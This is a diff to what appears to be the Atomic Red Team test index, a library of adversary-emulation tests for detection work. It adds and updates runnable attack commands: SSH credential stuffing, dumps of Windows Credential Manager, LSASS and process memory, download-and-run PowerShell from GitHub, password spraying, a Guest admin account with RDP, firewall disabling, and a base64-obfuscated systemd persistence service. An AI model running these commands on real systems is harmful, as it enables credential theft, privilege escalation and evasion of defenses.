@@ -831,7 +831,72 @@ credential-access:
       x_mitre_contributors:
       - Diogo Fernandes
       - Anastasios Pingios
-    atomic_tests: []
+      identifier: T1110.004
+    atomic_tests:
+    - name: SSH Credential Stuffing From Linux
+      auto_generated_guid: 4f08197a-2a8a-472d-9589-cd2895ef22ad
+      description: 'Using username,password combination from a password dump to login
+        over SSH.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        target_host:
+          description: IP Address / Hostname you want to target.
+          type: String
+          default: localhost
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'Requires SSHPASS
+
+'
+        prereq_command: 'if [ -x "$(command -v sshpass)" ]; then exit 0; else exit
+          1; fi;
+
+'
+        get_prereq_command: 'if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] ||
+          [ $(cat /etc/os-release | grep -i ID=kali) ]; then sudo apt update && sudo
+          apt install sshpass -y; else echo "This test requires sshpass" ; fi ;
+
+'
+      executor:
+        name: bash
+        elevation_required: false
+        command: |
+          cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
+          for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
+    - name: SSH Credential Stuffing From MacOS
+      auto_generated_guid: d546a3d9-0be5-40c7-ad82-5a7d79e1b66b
+      description: 'Using username,password combination from a password dump to login
+        over SSH.
+
+'
+      supported_platforms:
+      - macos
+      input_arguments:
+        target_host:
+          description: IP Address / Hostname you want to target.
+          type: String
+          default: localhost
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'Requires SSHPASS
+
+'
+        prereq_command: 'if [ -x "$(command -v sshpass)" ]; then exit 0; else exit
+          1; fi;
+
+'
+        get_prereq_command: |
+          /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"
+          brew install hudochenkov/sshpass/sshpass
+      executor:
+        name: bash
+        elevation_required: false
+        command: |
+          cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
+          for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
   T1552.001:
     technique:
       id: attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc
@@ -1048,13 +1113,40 @@ credential-access:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
         cleanup_command: 'Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction
           Ignore
 
 '
         name: powershell
+    - name: Dump credentials from Windows Credential Manager With PowerShell [windows
+        Credentials]
+      auto_generated_guid: c89becbe-1758-4e7d-a0f4-97d2188a23e3
+      description: This module will extract the credentials from Windows Credential
+        Manager
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1'
+          -UseBasicParsing); Get-PasswordVaultCredentials -Force   \n"
+    - name: Dump credentials from Windows Credential Manager With PowerShell [web
+        Credentials]
+      auto_generated_guid: 8fd5a296-6772-4766-9991-ff4e92af7240
+      description: This module will extract the credentials from Windows Credential
+        Manager
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1''
+          -UseBasicParsing); Get-CredManCreds -Force
+
+'
   T1555.003:
     technique:
       created: '2020-02-12T18:57:36.041Z'
@@ -2247,6 +2339,7 @@ credential-access:
       - windows
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
           Invoke-Kerberoast | fl
         name: powershell
@@ -2760,6 +2853,7 @@ credential-access:
 '
         get_prereq_command: |
           $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
           if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
             Expand-Archive $zippath $parentpath\wce -Force
@@ -2801,6 +2895,7 @@ credential-access:
 
 '
         get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
           Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
           New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
@@ -2855,6 +2950,7 @@ credential-access:
 
 '
         get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           New-Item -ItemType Directory (Split-Path #{dumpert_exe}) -Force | Out-Null
           Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile #{dumpert_exe}
       executor:
@@ -2909,6 +3005,7 @@ credential-access:
 
 '
         get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           $url = 'https://github.com/gentilkiwi/mimikatz/releases/latest'
           $request = [System.Net.WebRequest]::Create($url)
           $response = $request.GetResponse()
@@ -2992,10 +3089,9 @@ credential-access:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'');
-          get-process lsass | Out-Minidump
-
-'
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump
         cleanup_command: 'Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
 
 '
@@ -3130,10 +3226,9 @@ credential-access:
         prereq_command: 'if (Test-Path ''#{xordump_exe}'') {exit 0} else {exit 1}
 
 '
-        get_prereq_command: 'Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe"
-          -OutFile #{xordump_exe}
-
-'
+        get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe" -OutFile #{xordump_exe}
       executor:
         command: "#{xordump_exe} -out #{output_file} -x 0x41\n"
         cleanup_command: 'Remove-Item ${output_file} -ErrorAction Ignore
@@ -3944,8 +4039,9 @@ credential-access:
       - description: NPPSpy.dll must be available in local temp directory
         prereq_command: if (Test-Path "$env:Temp\NPPSPY.dll") {exit 0} else {exit
           1}
-        get_prereq_command: Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll
-          -OutFile "$env:Temp\NPPSPY.dll"
+        get_prereq_command: |-
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "$env:Temp\NPPSPY.dll"
       executor:
         command: |-
           Copy-Item "$env:Temp\NPPSPY.dll" -Destination "C:\Windows\System32"
@@ -4273,6 +4369,9 @@ credential-access:
           echo "1q2w3e4r" >> #{input_file_passwords}
           echo "Password!" >> #{input_file_passwords}
           @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
+        cleanup_command: |-
+          del #{input_file_users}
+          del #{input_file_passwords}
     - name: Brute Force Credentials of single domain user via LDAP against domain
         controller (NTLM or Kerberos)
       auto_generated_guid: c2969434-672b-4ec8-8df0-bbb91f40e250
@@ -4520,11 +4619,9 @@ credential-access:
       executor:
         name: powershell
         elevation_required: false
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1''
-          -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain
-          #{domain} -Force
-
-'
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
     - name: Password spray all domain users with a single password via LDAP against
         domain controller (NTLM or Kerberos)
       auto_generated_guid: f14d956a-5b6e-4a93-847f-0c415142f07d
@@ -4839,7 +4936,106 @@ credential-access:
       x_mitre_is_subtechnique: true
       x_mitre_platforms:
       - Linux
-    atomic_tests: []
+      identifier: T1003.007
+    atomic_tests:
+    - name: Dump individual process memory with sh (Local)
+      auto_generated_guid: 7e91138a-8e74-456d-a007-973d67a0bb80
+      description: |
+        Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
+        copy process memory to an external file so it can be searched or exfiltrated later.
+      supported_platforms:
+      - linux
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed
+          type: Path
+          default: "/tmp/T1003.007.bin"
+        script_path:
+          description: Path to script generating the target process
+          type: Path
+          default: "/tmp/T1003.007.sh"
+        pid_term:
+          description: Unique string to use to identify target process
+          type: String
+          default: T1003.007
+      dependencies:
+      - description: 'Script to launch target process must exist
+
+'
+        prereq_command: |
+          test -f #{script_path}
+          grep "#{pid_term}" #{script_path}
+        get_prereq_command: |
+          echo '#!/bin/sh' > #{script_path}
+          echo "sh -c 'echo \"The password is #{pid_term}\" && sleep 30' &" >> #{script_path}
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          sh #{script_path}
+          PID=$(pgrep -n -f "#{pid_term}")
+          HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
+          MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
+          MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
+          MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
+          dd if=/proc/"${PID}"/mem of="#{output_file}" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
+          grep -i "PASS" "#{output_file}"
+        cleanup_command: 'rm -f "#{output_file}"
+
+'
+    - name: Dump individual process memory with Python (Local)
+      auto_generated_guid: 437b2003-a20d-4ed8-834c-4964f24eec63
+      description: |
+        Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to
+        copy a process's heap memory to an external file so it can be searched or exfiltrated later.
+      supported_platforms:
+      - linux
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed
+          type: Path
+          default: "/tmp/T1003.007.bin"
+        script_path:
+          description: Path to script generating the target process
+          type: Path
+          default: "/tmp/T1003.007.sh"
+        python_script:
+          description: Path to script generating the target process
+          type: Path
+          default: PathToAtomicsFolder/T1003.007/src/dump_heap.py
+        pid_term:
+          description: Unique string to use to identify target process
+          type: String
+          default: T1003.007
+      dependencies:
+      - description: 'Script to launch target process must exist
+
+'
+        prereq_command: |
+          test -f #{script_path}
+          grep "#{pid_term}" #{script_path}
+        get_prereq_command: |
+          echo '#!/bin/sh' > #{script_path}
+          echo "sh -c 'echo \"The password is #{pid_term}\" && sleep 30' &" >> #{script_path}
+      - description: 'Requires Python
+
+'
+        prereq_command: "(which python || which python3 || which python2)\n"
+        get_prereq_command: 'echo "Python 2.7+ or 3.4+ must be installed"
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          sh #{script_path}
+          PID=$(pgrep -n -f "#{pid_term}")
+          PYTHON=$(which python || which python3 || which python2)
+          $PYTHON #{python_script} $PID #{output_file}
+          grep -i "PASS" "#{output_file}"
+        cleanup_command: 'rm -f "#{output_file}"
+
+'
   T1606.002:
     technique:
       external_references:
@@ -6735,8 +6931,9 @@ collection:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA"
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"
         cleanup_command: 'Remove-Item "$env:TEMP\atomic_T1115_clipboard_data.txt"
           -ErrorAction Ignore
@@ -9155,7 +9352,8 @@ privilege-escalation:
         computer starts up various applications and may in fact drive you crazy. A
         reliable way to make the message box appear and verify the \nAppInit Dlls
         are loading is to start the notepad application. Be sure to run the cleanup
-        commands afterwards so you don't keep getting message boxes showing up\n"
+        commands afterwards so you don't keep getting message boxes showing up.\n\nNote:
+        If secure boot is enabled, this technique will not work. https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls\n"
       supported_platforms:
       - windows
       input_arguments:
@@ -11235,9 +11433,9 @@ privilege-escalation:
     atomic_tests:
     - name: Enable Guest account with RDP capability and admin priviliges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
-      description: After execution the Default Guest account will be enabled (Active)
-        and added to Administrators and Remote Desktop Users Group, and desktop will
-        allow multiple RDP connections
+      description: |
+        After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
+        and desktop will allow multiple RDP connections.
       supported_platforms:
       - windows
       input_arguments:
@@ -11249,6 +11447,10 @@ privilege-escalation:
           description: Specify the guest password
           type: String
           default: Password123!
+        remove_rdp_access_during_cleanup:
+          description: Set to 1 if you want the cleanup to remove RDP access to machine
+          type: Integer
+          default: 0
       executor:
         command: |-
           net user #{guest_user} /active:yes
@@ -11261,8 +11463,9 @@ privilege-escalation:
           net user #{guest_user} /active:no >nul 2>&1
           net localgroup administrators #{guest_user} /delete >nul 2>&1
           net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
+          if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
+          if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
+          if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
         name: command_prompt
         elevation_required: true
   T1078.002:
@@ -15033,7 +15236,8 @@ privilege-escalation:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+        command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n"
         name: powershell
@@ -15167,7 +15371,8 @@ privilege-escalation:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
         name: powershell
     - name: Remote Process Injection in LSASS via mimikatz
@@ -15203,6 +15408,7 @@ privilege-escalation:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
@@ -15215,6 +15421,7 @@ privilege-escalation:
 
 '
         get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
           New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
@@ -16060,7 +16267,8 @@ privilege-escalation:
 
 '
       executor:
-        command: "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\"
+        command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
+          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
@@ -17073,6 +17281,48 @@ privilege-escalation:
           rm -rf #{systemd_service_path}/#{systemd_service_file}
           systemctl daemon-reload
         name: bash
+    - name: Create Systemd Service file,  Enable the service , Modify and Reload the
+        service.
+      auto_generated_guid: c35ac4a8-19de-43af-b9f8-755da7e89c89
+      description: "This test creates a systemd service unit file and enables it to
+        autostart on boot. Once service is created and enabled, it also modifies this
+        same service file showcasing both Creation and Modification of system process.
+        \n"
+      supported_platforms:
+      - linux
+      dependencies:
+      - description: 'System must be Ubuntu ,Kali OR CentOS.
+
+'
+        prereq_command: 'if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat
+          /etc/os-release | grep -i ID=kali) ] || [ $(cat /etc/os-release | grep -i
+          ''ID="centos"'') ]; then exit /b 0; else exit /b 1; fi;
+
+'
+        get_prereq_command: 'echo Please run from Ubuntu ,Kali OR CentOS.
+
+'
+      executor:
+        name: bash
+        elevation_required: true
+        command: "cat > /etc/init.d/T1543.002 << EOF\n#!/bin/bash\n### BEGIN INIT
+          INFO\n# Provides : Atomic Test T1543.002\n# Required-Start: $all\n# Required-Stop
+          : \n# Default-Start: 2 3 4 5\n# Default-Stop: \n# Short Description: Atomic
+          Test for Systemd Service Creation\n### END INIT INFO\npython3 -c \"import
+          os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))\"\nEOF\n\nchmod
+          +x /etc/init.d/T1543.002\nif [ $(cat /etc/os-release | grep -i ID=ubuntu)
+          ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002
+          defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then
+          chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali
+          OR centos\" ; fi ;\nsystemctl enable T1543.002\nsystemctl start T1543.002\n\necho
+          \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\"
+          | sudo tee -a /etc/init.d/T1543.002\nsystemctl daemon-reload\nsystemctl
+          restart T1543.002\n"
+        cleanup_command: |
+          systemctl stop T1543.002
+          systemctl disable T1543.002
+          rm -rf /etc/init.d/T1543.002
+          systemctl daemon-reload
   T1053.006:
     technique:
       id: attack-pattern--a542bac9-7bc1-4da7-9a09-96f69e23cc21
@@ -17442,8 +17692,9 @@ privilege-escalation:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
-          -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
         name: powershell
         elevation_required: true
     - name: "`SeDebugPrivilege` token duplication"
@@ -17454,8 +17705,9 @@ privilege-escalation:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
-          -UseBasicParsing); Get-System -Technique Token -Verbose
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
         name: powershell
         elevation_required: true
   T1546.005:
@@ -18861,7 +19113,7 @@ defense-evasion:
         command: |
           bitsadmin.exe /create #{bits_job_name}
           bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
-          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
+          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL
           bitsadmin.exe /resume #{bits_job_name}
           timeout 5
           bitsadmin.exe /complete #{bits_job_name}
@@ -20202,7 +20454,8 @@ defense-evasion:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
         name: powershell
         elevation_required: true
@@ -21404,9 +21657,9 @@ defense-evasion:
     atomic_tests:
     - name: Enable Guest account with RDP capability and admin priviliges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
-      description: After execution the Default Guest account will be enabled (Active)
-        and added to Administrators and Remote Desktop Users Group, and desktop will
-        allow multiple RDP connections
+      description: |
+        After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
+        and desktop will allow multiple RDP connections.
       supported_platforms:
       - windows
       input_arguments:
@@ -21418,6 +21671,10 @@ defense-evasion:
           description: Specify the guest password
           type: String
           default: Password123!
+        remove_rdp_access_during_cleanup:
+          description: Set to 1 if you want the cleanup to remove RDP access to machine
+          type: Integer
+          default: 0
       executor:
         command: |-
           net user #{guest_user} /active:yes
@@ -21430,8 +21687,9 @@ defense-evasion:
           net user #{guest_user} /active:no >nul 2>&1
           net localgroup administrators #{guest_user} /delete >nul 2>&1
           net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
+          if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
+          if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
+          if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
         name: command_prompt
         elevation_required: true
   T1578.003:
@@ -22146,6 +22404,23 @@ defense-evasion:
 
 '
         cleanup_command: 'netsh advfirewall set currentprofile state on >nul 2>&1
+
+'
+        name: command_prompt
+    - name: Disable Microsoft Defender Firewall via Registry
+      auto_generated_guid: afedc8c4-038c-4d82-b3e5-623a95f8a612
+      description: |
+        Disables the Microsoft Defender Firewall for the public profile via registry
+        Caution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...
+      supported_platforms:
+      - windows
+      executor:
+        command: 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile"
+          /v "EnableFirewall" /t REG_DWORD /d 0 /f
+
+'
+        cleanup_command: 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile"
+          /v "EnableFirewall" /t REG_DWORD /d 1 /f
 
 '
         name: command_prompt
@@ -25023,13 +25298,14 @@ defense-evasion:
         command: |
           $macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt")
           $macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin"
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
         cleanup_command: 'Remove-Item "$env:TEMP\extracted.exe" -ErrorAction Ignore
 
 '
         name: powershell
-    - name: Create a user called "$" as noted here
+    - name: Create a Hidden User Called "$"
       auto_generated_guid: 2ec63cc2-4975-41a6-bf09-dffdfb610778
       description: Creating a user with a username containing "$"
       supported_platforms:
@@ -27174,7 +27450,78 @@ defense-evasion:
       x_mitre_version: '1.0'
       x_mitre_defense_bypassed:
       - Anti-virus, Application control
-    atomic_tests: []
+      identifier: T1553.005
+    atomic_tests:
+    - name: Mount ISO image
+      auto_generated_guid: 002cca30-4778-4891-878a-aaffcfa502fa
+      description: 'Mounts ISO image downloaded from internet to evade Mark-of-the-Web.
+        Upon successful execution, powershell will download the .iso from the Atomic
+        Red Team repo, and mount the image. The provided sample ISO simply has a Reports
+        shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        path_of_iso:
+          description: Path to ISO file
+          type: path
+          default: PathToAtomicsFolder\T1553.005\bin\T1553.005.iso
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'T1553.005.iso must exist on disk at specified location (#{path_of_iso})
+
+'
+        prereq_command: 'if (Test-Path #{path_of_iso}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{path_of_iso}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/T1553.005.iso -OutFile "#{path_of_iso}"
+      executor:
